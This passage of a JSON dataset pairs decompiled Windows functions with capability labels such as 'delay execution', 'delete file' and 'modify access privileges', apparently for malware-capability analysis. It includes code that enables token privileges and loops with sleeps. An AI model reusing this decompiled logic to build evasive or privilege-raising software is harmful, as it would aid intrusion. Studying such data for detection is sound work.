        "decompiled_code": "\nvoid __fastcall fcn.00406ced(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41caa8 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41caa8 = *0x41caa8 >> 8 ^ *((uVar1 ^ *0x41caa8 & 0xff) * 4 + 0x410500) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.00403864(0x41cb0c);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 444
    },
    "00407f2b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00407f2b(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00409beb": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.00409beb(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.004095d7();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040958f();\n    return 0;\n}\n",
        "token_count": 80
    },
    "00407d2a": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00407d2a(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41cdf0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 218
    },
    "004037f2": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.004037f2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "00403f18": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403f18(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.004037f2();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.00405f66();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 189
    },
    "00408cf8": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408cf8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    }
}